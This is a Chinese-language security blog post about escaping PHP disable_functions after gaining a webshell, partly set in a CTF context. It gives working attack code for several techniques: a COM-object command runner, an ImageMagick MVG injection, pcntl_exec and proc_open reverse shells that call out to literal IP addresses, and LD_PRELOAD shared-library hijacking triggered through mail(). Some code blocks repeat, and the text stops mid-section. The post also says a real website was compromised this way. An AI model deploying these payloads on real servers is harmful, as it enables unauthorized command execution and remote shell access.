<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  

  
  <title>rce | zhiliya</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta name="description" content="根目录的 &#x2F;flag 无法读取 &#x2F;flag 是没有权限读取的，打过 CTF 的都知道，一般这个时候，根目录会留一个 &#x2F;readflag 来让 ctfer 执行命令拿 flag，&#x2F;readflag 会有一个 s 权限 Linux 文件权限与 ACL   环境变量 LD_preload + mail 劫持 so 来执行系统命令    webshell 居然无法执行系统命令，怀疑服务端 disable_">
<meta property="og:type" content="article">
<meta property="og:title" content="rce">
<meta property="og:url" content="http://yoursite.com/2019/11/29/rce/index.html">
<meta property="og:site_name" content="zhiliya">
<meta property="og:description" content="根目录的 &#x2F;flag 无法读取 &#x2F;flag 是没有权限读取的，打过 CTF 的都知道，一般这个时候，根目录会留一个 &#x2F;readflag 来让 ctfer 执行命令拿 flag，&#x2F;readflag 会有一个 s 权限 Linux 文件权限与 ACL   环境变量 LD_preload + mail 劫持 so 来执行系统命令    webshell 居然无法执行系统命令，怀疑服务端 disable_">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://image.3001.net/images/20181215/1544880208_5c150050dbc20.png!small">
<meta property="og:image" content="http://yoursite.com/2019/11/29/rce/51.png">
<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20190531163500-fad14268-837e-1.png">
<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20190531163853-8587f852-837f-1.png">
<meta property="og:image" content="https://image.3001.net/images/20181215/1544880268_5c15008ca5d03.png!small">
<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20190531171055-fedc768e-8383-1.png">
<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20190531171152-212aeaf4-8384-1.png">
<meta property="og:image" content="https://image.3001.net/images/20181215/1544880281_5c15009921d27.png!small">
<meta property="og:image" content="https://image.3001.net/images/20181215/1544880287_5c15009f70c19.png!small">
<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20190531165011-19a41c2c-8381-1.png">
<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20190531165654-09f5372e-8382-1.png">
<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20190531170751-91a13712-8383-1.png">
<meta property="og:image" content="https://p4.ssl.qhimg.com/t011363df8d77bc765d.png">
<meta property="og:image" content="https://p0.ssl.qhimg.com/t018ee5e5eadefc3997.png">
<meta property="og:image" content="https://p2.ssl.qhimg.com/t01b63cd8517778cd0f.png">
<meta property="og:image" content="https://image.3001.net/images/20181215/1544880349_5c1500dd492a1.png!small">
<meta property="article:published_time" content="2019-11-29T09:19:40.000Z">
<meta property="article:modified_time" content="2020-07-31T10:49:19.194Z">
<meta property="article:author" content="zhiliya">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://image.3001.net/images/20181215/1544880208_5c150050dbc20.png!small">
  
    <link rel="alternate" href="/atom.xml" title="zhiliya" type="application/atom+xml">
  
  
    <link rel="icon" href="/favicon.png">
  
  
    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
  
  
<link rel="stylesheet" href="/css/style.css">

<meta name="generator" content="Hexo 4.2.0"></head>

<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/" id="logo">zhiliya</a>
      </h1>
      
        <h2 id="subtitle-wrap">
          <a href="/" id="subtitle">欢迎访问我的博客</a>
        </h2>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"></a>
        
          <a class="main-nav-link" href="/">Home</a>
        
          <a class="main-nav-link" href="/archives">Archives</a>
        
      </nav>
      <nav id="sub-nav">
        
          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
        
        <a id="nav-search-btn" class="nav-icon" title="搜索"></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://yoursite.com"></form>
      </div>
    </div>
  </div>
</header>
      <div class="outer">
        <section id="main"><article id="post-rce" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2019/11/29/rce/" class="article-date">
  <time datetime="2019-11-29T09:19:40.000Z" itemprop="datePublished">2019-11-29</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 class="article-title" itemprop="name">
      rce
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h3 id="根目录的-flag-无法读取"><a href="#根目录的-flag-无法读取" class="headerlink" title="根目录的 /flag 无法读取"></a>根目录的 /flag 无法读取</h3><p> /flag 是没有权限读取的，打过 CTF 的都知道，一般这个时候，根目录会留一个 /readflag 来让 ctfer 执行命令拿 flag，/readflag 会有一个 s 权限 <a href="http://www.361way.com/rh134-acl-chattr/4640.html" target="_blank" rel="noopener">Linux 文件权限与 ACL</a> </p>
<p> 环境变量 LD_preload + mail 劫持 so 来执行系统命令 </p>
<p>  <strong>webshell 居然无法执行系统命令，怀疑服务端 disable_functions 禁用了命令执行函数，通过环境变量 LD_PRELOAD 劫持系统函数，却又发现目标根本没安装 sendmail，无法执行命令 的 webshell 是无意义的，看我如何突破！</strong> </p>
<p> getshell 后我会先了解下该系统配置，虚拟终端中执行 cat /proc/meminfo 但执行报错： </p>
<p> <a href="https://image.3001.net/images/20181215/1544880208_5c150050dbc20.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20181215/1544880208_5c150050dbc20.png!small" alt="image.png"></a></p>
<p> 怀疑有 WAF 拦劫了待执行的命令，尝试了<strong>空字符串</strong>、<strong>路径扩展</strong>、<strong>自定义变量</strong>平时常用的几种绕命令执行限制的手法，结果都失败： </p>
<p><img src="/2019/11/29/rce/51.png" alt="51"></p>
<p>导致 webshell 不能执行命令的原因大概有三类：</p>
<p>一是 php.ini 中用 disable_functions 指示器禁用了 system ()、exec () 等等这类命令执行的相关函数；</p>
<p>二是 web 进程运行在 rbash 这类受限 shell 环境中；</p>
<p>三是 WAF 拦劫。若是一则无法执行任何命令，若是二、三则可以执行少量命令。从当前现象来看，很可能由 disable_functions 所致。 </p>
<p> 为验证，我利用前面的 RCE 漏洞执行 phpinfo ()，确认的确如此：</p>
<h3 id="有四种绕过-disable-functions-的手法："><a href="#有四种绕过-disable-functions-的手法：" class="headerlink" title="有四种绕过 disable_functions 的手法："></a>有四种绕过 disable_functions 的手法：</h3><h4 id="第一种"><a href="#第一种" class="headerlink" title="第一种"></a>第一种</h4><p>，攻击后端组件，寻找存在命令注入的、web 应用常用的后端组件，如，ImageMagick 的魔图漏洞、bash 的破壳漏洞；</p>
<h5 id="系统组件绕过"><a href="#系统组件绕过" class="headerlink" title="系统组件绕过"></a>系统组件绕过</h5><p>window com组件(php 5.4)(高版本扩展要自己添加）<br>条件：要在php.ini中开启（如图）</p>
<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20190531163500-fad14268-837e-1.png" target="_blank" rel="noopener"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190531163500-fad14268-837e-1.png" alt="img"></a></p>
<p>利用代码，利用shell上传如下代码到目标服务器上</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$command&#x3D;$_GET[&#39;a&#39;];</span><br><span class="line">$wsh &#x3D; new COM(&#39;WScript.shell&#39;); &#x2F;&#x2F; 生成一个COM对象　Shell.Application也能</span><br><span class="line">$exec &#x3D; $wsh-&gt;exec(&quot;cmd &#x2F;c &quot;.$command); &#x2F;&#x2F;调用对象方法来执行命令</span><br><span class="line">$stdout &#x3D; $exec-&gt;StdOut();</span><br><span class="line">$stroutput &#x3D; $stdout-&gt;ReadAll();</span><br><span class="line">echo $stroutput;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>利用成功后的结果<br><a href="https://xzfile.aliyuncs.com/media/upload/picture/20190531163853-8587f852-837f-1.png" target="_blank" rel="noopener"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190531163853-8587f852-837f-1.png" alt="img"></a></p>
<h4 id><a href="#" class="headerlink" title></a></h4><h5 id="ImageMagick"><a href="#ImageMagick" class="headerlink" title="ImageMagick"></a>ImageMagick</h5><p>利用代码如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">echo &quot;Disable Functions: &quot; . ini_get(&#39;disable_functions&#39;) . &quot;\n&quot;;</span><br><span class="line"></span><br><span class="line">$command &#x3D; PHP_SAPI &#x3D;&#x3D; &#39;cli&#39; ? $argv[1] : $_GET[&#39;cmd&#39;];</span><br><span class="line">if ($command &#x3D;&#x3D; &#39;&#39;) &#123;</span><br><span class="line">    $command &#x3D; &#39;id&#39;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$exploit &#x3D; &lt;&lt;&lt;EOF</span><br><span class="line">push graphic-context</span><br><span class="line">viewbox 0 0 640 480</span><br><span class="line">fill &#39;url(https:&#x2F;&#x2F;example.com&#x2F;image.jpg&quot;|$command&quot;)&#39;</span><br><span class="line">pop graphic-context</span><br><span class="line">EOF;</span><br><span class="line"></span><br><span class="line">file_put_contents(&quot;KKKK.mvg&quot;, $exploit);</span><br><span class="line">$thumb &#x3D; new Imagick();</span><br><span class="line">$thumb-&gt;readImage(&#39;KKKK.mvg&#39;);</span><br><span class="line">$thumb-&gt;writeImage(&#39;KKKK.png&#39;);</span><br><span class="line">$thumb-&gt;clear();</span><br><span class="line">$thumb-&gt;destroy();</span><br><span class="line">unlink(&quot;KKKK.mvg&quot;);</span><br><span class="line">unlink(&quot;KKKK.png&quot;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>尝试第一种时，我用 phpinfo () 查看 ImageMagick 版本为 v6.9.4-10： </p>
<p>用 searchsploit（exploit-db.com 的本地版）搜索存在命令注入的版本为 v6.9.3-9 或 v7.0.1-0：</p>
<p><a href="https://image.3001.net/images/20181215/1544880268_5c15008ca5d03.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20181215/1544880268_5c15008ca5d03.png!small" alt="image.png"></a></p>
<p> 显然，当前 ImageMagick 无法利用 </p>
<h4 id="第二种，"><a href="#第二种，" class="headerlink" title="第二种，"></a>第二种，</h4><p>寻找未禁用的漏网函数，常见的执行命令的函数有 system ()、exec ()、shell_exec ()、passthru ()，偏僻的 popen ()、proc_open ()、pcntl_exec ()，逐一尝试，或许有漏网之鱼；</p>
<p> 尝试第二种时，常见的、不常见的、罕见的（如 dl ()），所有可启动进程的函数均被禁用； </p>
<h5 id="pcntl-exec"><a href="#pcntl-exec" class="headerlink" title="pcntl_exec"></a>pcntl_exec</h5><p>pcntl是linux下的一个扩展，可以支持php的多线程操作。(与python结合反弹shell) pcntl_exec函数的作用是在当前进程空间执行指定程序，版本要求：PHP 4 &gt;= 4.2.0, PHP 5</p>
<p>利用代码如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php  pcntl_exec(&quot;&#x2F;usr&#x2F;bin&#x2F;python&quot;,array(&#39;-c&#39;, &#39;import socket,subprocess,os;s&#x3D;socket.socket(socket.AF_INET,socket.SOCK_STREAM,socket.SOL_TCP);s.connect((&quot;132.232.75.90&quot;,9898));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p&#x3D;subprocess.call([&quot;&#x2F;bin&#x2F;bash&quot;,&quot;-i&quot;]);&#39;));?&gt;</span><br></pre></td></tr></table></figure>

<p>曾经就有一个网站是如此拿下的</p>
<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20190531171055-fedc768e-8383-1.png" target="_blank" rel="noopener"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190531171055-fedc768e-8383-1.png" alt="img"></a></p>
<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20190531171152-212aeaf4-8384-1.png" target="_blank" rel="noopener"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190531171152-212aeaf4-8384-1.png" alt="img"></a></p>
<h3 id="-1"><a href="#-1" class="headerlink" title></a></h3><h5 id="proc-open"><a href="#proc-open" class="headerlink" title="proc_open"></a>proc_open</h5><p>disable_function忘记添加proc_open，用curl带出来就好</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">"http://nctf2019.x1ct34m.com:60004/?useful=/etc/passwd&amp;code=$a=%22create_f%22.%22unction%22;$c=$a(%27%27,$_POST[a]);$c();"</span></span><br><span class="line"><span class="keyword">print</span> requests.post(url,data=&#123;<span class="string">'a'</span>:<span class="string">"""</span></span><br><span class="line"><span class="string">$descriptorspec=array(</span></span><br><span class="line"><span class="string">    0=&gt;array('pipe','r'), //STDIN</span></span><br><span class="line"><span class="string">    1=&gt;array('pipe','w'),//STDOUT</span></span><br><span class="line"><span class="string">    2=&gt;array('pipe','w') //STDERROR</span></span><br><span class="line"><span class="string">);</span></span><br><span class="line"><span class="string">$handle=proc_open('bash -c "bash -i &gt;&amp; /dev/tcp/122.152.230.160/2333 0&gt;&amp;1"',$descriptorspec,$pipes,NULL);</span></span><br><span class="line"><span class="string">var_dump($handle);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">"""</span>&#125;).text</span><br></pre></td></tr></table></figure>



<h4 id="第三种"><a href="#第三种" class="headerlink" title="第三种"></a>第三种</h4><p>，mod_cgi 模式，尝试修改 .htaccess，调整请求访问路由，绕过 php.ini 中的任何限制；</p>
<p> 尝试第三种时，发现并未启用 mod_cgi 模式。所有希望，寄托在 LD_PRELOAD。 </p>
<h4 id="第四种，php的putenv来设置LD-PRELOAD-劫持sendmail-既能绕过-open-basedir，又能绕过-disable-functions"><a href="#第四种，php的putenv来设置LD-PRELOAD-劫持sendmail-既能绕过-open-basedir，又能绕过-disable-functions" class="headerlink" title="第四种，php的putenv来设置LD_PRELOAD      劫持sendmail 既能绕过 open basedir，又能绕过 disable functions"></a>第四种，php的putenv来设置LD_PRELOAD      劫持sendmail 既能绕过 open basedir，又能绕过 disable functions</h4><p> 利用漏洞控制 web 启动新进程 a.bin（即便进程名无法让我随意指定），a.bin 内部调用系统函数 b ()，b () 位于系统共享对象 c.so 中，所以系统为该进程加载共 c.so，我想法在 c.so 前优先加载可控的 c_evil.so，c_evil.so 内含与 b () 同名的恶意函数，由于 c_evil.so 优先级较高，所以，a.bin 将调用到 c_evil.so 内 b () 而非系统的 c.so 内 b ()，同时，c_evil.so 可控，达到执行恶意代码的目的。基于这一思路，将突破 disable_functions 限制执行操作系统命令这一目标，大致分解成几步在本地推演：查看进程调用系统函数明细、操作系统环境下劫持系统函数注入代码、找寻内部启动新进程的 PHP 函数、PHP 环境下劫持系统函数注入代码。 </p>
<p>查看进程调用系统函数明细。linux 创建新进程的过程较为复杂，我关心进程加载了哪些共享对象、可能调用哪些 API、实际调用了哪些 API。比如，运行 /usr/bin/id，通过 ldd 可查看系统为其加载的共享对象：</p>
<p><a href="https://image.3001.net/images/20181215/1544880281_5c15009921d27.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20181215/1544880281_5c15009921d27.png!small" alt="image.png"></a></p>
<p>由于可执行文件 /usr/bin/id 内含符号表，所以，运行 nm -D /usr/bin/id 2&gt;&amp;1 或 readelf -Ws /usr/bin/id 可查看该程序可能调用的系统 API 明细：</p>
<p><a href="https://image.3001.net/images/20181215/1544880287_5c15009f70c19.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20181215/1544880287_5c15009f70c19.png!small" alt="image.png"></a></p>
<h5 id="传统方式-hijacking-function"><a href="#传统方式-hijacking-function" class="headerlink" title="传统方式 (hijacking function)"></a>传统方式 (hijacking function)</h5><p>在已有的文章中显示，一般使用 php<code>mail()</code> 函数进行触发，我们简单分析一下</p>
<p>利用环境变量 LD_PRELOAD 劫持系统函数，让外部程序加载恶意 *.so，达到执行系统命令的效果。 </p>
<p> php的mail函数在执行过程中会默认调用系统程序/usr/sbin/sendmail，如果我们能劫持sendmail程序，再用mail函数来触发就能实现我们的目的 </p>
<p>利用原理</p>
<p>LD_PRELOAD是Linux系统的下一个有趣的环境变量：“它允许你定义在程序运行前优先加载的动态链接库。这个功能主要就是用来有选择性的载入不同动态链接库中的相同函数。通过这个环境变量，我们可以在主程序和其动态链接库的中间加载别的动态链接库，甚至覆盖正常的函数库。一方面，我们可以以此功能来使用自己的或是更好的函数（无需别人的源码），而另一方面，我们也可以以向别人的程序注入程序，从而达到特定的目的。</p>
<p>可能这个不好理解，我们做一个简单的测试代码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">int main(int argc, char **argv)&#123;</span><br><span class="line">char passwd[] &#x3D; &quot;password&quot;;</span><br><span class="line">if (argc &lt; 2) &#123;</span><br><span class="line">        printf(&quot;usage: %s &lt;password&gt;&#x2F;n&quot;, argv[0]);</span><br><span class="line">        return 0;</span><br><span class="line">&#125;</span><br><span class="line">if (!strcmp(passwd, argv[1])) &#123;</span><br><span class="line">        printf(&quot;Correct Password!&#x2F;n&quot;);</span><br><span class="line">        return 0;</span><br><span class="line">&#125;</span><br><span class="line">printf(&quot;Invalid Password!&#x2F;n&quot;);</span><br><span class="line">&#125;</span><br><span class="line"># 保存为a.c，并编译为a</span><br></pre></td></tr></table></figure>

<p>保存如上代码为a.c，并编译为a,编译命令如下</p>
<blockquote>
<p>gcc a.c -o a</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">int main(int argc, char **argv)&#123;</span><br><span class="line">char passwd[] &#x3D; &quot;password&quot;;</span><br><span class="line">if (argc &lt; 2) &#123;</span><br><span class="line">        printf(&quot;usage: %s &lt;password&gt;&#x2F;n&quot;, argv[0]);</span><br><span class="line">        return 0;</span><br><span class="line">&#125;</span><br><span class="line">if (!strcmp(passwd, argv[1])) &#123;</span><br><span class="line">        printf(&quot;Correct Password!&#x2F;n&quot;);</span><br><span class="line">        return 0;</span><br><span class="line">&#125;</span><br><span class="line">printf(&quot;Invalid Password!&#x2F;n&quot;);</span><br><span class="line">&#125;</span><br><span class="line"># 保存为a.c，并编译为a</span><br></pre></td></tr></table></figure>

<p>保存如上代码为a.c，并编译为a,编译命令如下</p>
<blockquote>
<p>gcc a.c -o a</p>
</blockquote>
<p>运行a结果如下<br><a href="https://xzfile.aliyuncs.com/media/upload/picture/20190531165011-19a41c2c-8381-1.png" target="_blank" rel="noopener"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190531165011-19a41c2c-8381-1.png" alt="img"></a></p>
<p>以上程序很简单，根据判断传入的字符串是否等于”password”，得出两种不同结果。 其中用到了标准C函数strcmp函数来做比较，这是一个外部调用函数，我们来重新编写一个同名函数,代码如下(保存如下代码为b.c)</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">int strcmp(const char *s1, const char *s2)&#123;</span><br><span class="line">    printf(&quot;hack functio  n invoked. s1&#x3D;&lt;%s&gt; s2&#x3D;&lt;%s&gt;&#x2F;n&quot;, s1, s2);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们编译以上代码为一个动态共享库，编译命令如下</p>
<blockquote>
<p>gcc -fPIC -shared b.c -o b.so</p>
</blockquote>
<p><strong>通过LD_PRELOAD来设置它能被其他调用它的程序优先加载</strong></p>
<blockquote>
<p><strong>export LD_PRELOAD=”./b.so”</strong></p>
</blockquote>
<p>我们再次运行a<br>./a bbb<br>Correct Password!</p>
<p>我们看到随意输入字符串都会显示密码正确，这说明程序在运行时优先加载了我们自己编写的程序。这也就是说如果程序在运行过程中调用了某个标准的动态链接库的函数，那么我们就有机会通过LD_PRELOAD来设置它优先加载我们自己编写的程序，实现劫持</p>
<h6 id="结合mail-函数进行实战测试"><a href="#结合mail-函数进行实战测试" class="headerlink" title="结合mail 函数进行实战测试"></a>结合mail 函数进行实战测试</h6><p>那么我们来看一下sendmail函数都调用了哪些库函数，使用<strong>readelf -Ws /usr/sbin/sendmail</strong>命令来查看，我们发现sendmail函数在运行过程动态调用了很多标准库函数：</p>
<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20190531165654-09f5372e-8382-1.png" target="_blank" rel="noopener"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190531165654-09f5372e-8382-1.png" alt="img"></a></p>
<h6 id="构造poc思路"><a href="#构造poc思路" class="headerlink" title="构造poc思路"></a>构造poc思路</h6><p>编制我们自己的动态链接程序。 通过php的<strong>putenv</strong>来设置LD_PRELOAD，让我们的程序优先被调用。 在webshell上用mail函数发送一封邮件来触发。具体实现如下</p>
<p>1.编制我们自己的动态链接程序，代码如下（功能是执行mkdir test）<br>执行编译为一个动态共享库的命令如下</p>
<blockquote>
<p>gcc -c -fPIC a.c -o a<br>gcc -shared a -o a.so</p>
</blockquote>
<p>代码</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">payload</span><span class="params">()</span></span>&#123;</span><br><span class="line">         FILE*fp = fopen(<span class="string">"/tmp/2.txt"</span>,<span class="string">"w"</span>);</span><br><span class="line">         fclose(fp);</span><br><span class="line">         system(<span class="string">"mkdir /var/www/html/test"</span>);</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">geteuid</span><span class="params">()</span></span>&#123;</span><br><span class="line">  FILE *fp1=fopen(<span class="string">"/tmp/2.txt"</span>,<span class="string">"r"</span>);</span><br><span class="line">  <span class="keyword">if</span>(fp1!=<span class="literal">NULL</span>)</span><br><span class="line">  &#123;</span><br><span class="line">   fclose(fp1);</span><br><span class="line">         <span class="keyword">return</span> <span class="number">552</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">         payload();</span><br><span class="line">         <span class="keyword">return</span> <span class="number">552</span>;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">payload</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        system(<span class="string">"ls / &gt; /tmp/sky"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">geteuid</span><span class="params">()</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (getenv(<span class="string">"LD_PRELOAD"</span>) == <span class="literal">NULL</span>) &#123; <span class="keyword">return</span> <span class="number">0</span>; &#125;</span><br><span class="line">    unsetenv(<span class="string">"LD_PRELOAD"</span>);</span><br><span class="line">    payload();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>2.利用webshell，上传编译后的a.so到目标服务器<br>3.通过putenv来设置LD_PRELOAD，让我们的程序优先被调用。在webshell上用mail函数发送一封邮件来触发。利用代码如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">   putenv(&quot;LD_PRELOAD&#x3D;&#x2F;var&#x2F;www&#x2F;html&#x2F;a.so&quot;);</span><br><span class="line">   mail(&quot;[email protected]&quot;,&quot;&quot;,&quot;&quot;,&quot;&quot;,&quot;&quot;);</span><br><span class="line">  ?&gt;</span><br><span class="line">  </span><br><span class="line">&lt;?php</span><br><span class="line">putenv(&quot;LD_PRELOAD&#x3D;.&#x2F;hack.so&quot;);</span><br><span class="line">mail(&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;);</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">1. 制作一个恶意 shared libraries</span><br><span class="line">2. 使用 putenv 设置 LD_PRELOAD 为恶意文件路径</span><br><span class="line">3. 使用某个 php 函数，触发 specific shared library</span><br><span class="line">4. 成功进行 RCE</span><br></pre></td></tr></table></figure>

<p>结果如下，成功执行命令，创建文件test</p>
<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20190531170751-91a13712-8383-1.png" target="_blank" rel="noopener"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190531170751-91a13712-8383-1.png" alt="img"></a></p>
<h5 id="改进版-hijack-shared-library"><a href="#改进版-hijack-shared-library" class="headerlink" title="改进版 (hijack shared library)"></a>改进版 (hijack shared library)</h5><p>但其实这个方法是将条件变得严苛了，我们干的事情局限于找到一个函数，然后对其进行注入</p>
<p>但实际上我们可以更加直接，我们先将 sendmail 进行删除</p>
<p><a href="https://p4.ssl.qhimg.com/t011363df8d77bc765d.png" target="_blank" rel="noopener"><img src="https://p4.ssl.qhimg.com/t011363df8d77bc765d.png" alt="img"></a></p>
<p>如图所示现在已经没有了 sendmail，但我们依旧可以进行 rce，可使用如下文件 sky.c</p>
